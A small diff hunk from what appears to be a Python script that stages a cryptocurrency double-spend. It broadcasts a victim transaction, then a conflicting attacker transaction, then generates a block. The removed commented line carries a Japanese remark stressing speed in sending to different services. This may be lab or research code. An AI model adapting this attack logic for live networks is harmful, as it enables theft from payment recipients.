@@ -191,7 +191,6 @@ else:
     transaction_util.pushtx(tx_victim)
 # >>>> FRK BC EXE DSPND 0w0
 print()
-#transaction_util.pushtx(block) #異なるサービスに素早く送ることが重要。
 send_rawtransaction(tx_attacker)
 input("--- READY... --- ")
 print("generating block")
